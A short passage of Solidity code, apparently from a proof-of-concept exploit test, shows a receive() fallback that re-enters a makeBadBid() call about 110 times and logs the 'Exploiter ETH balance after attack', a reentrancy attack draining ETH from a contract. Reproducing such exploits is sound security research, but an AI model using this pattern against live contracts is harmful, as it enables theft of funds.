        makeBadBid();

        emit log_named_decimal_uint("Exploiter ETH balance after attack", address(this).balance, 18);
    }

    receive() external payable {
        if (reentrancyCalls <= 109) {
            ++reentrancyCalls;
            makeBadBid();
        } else {
            return;
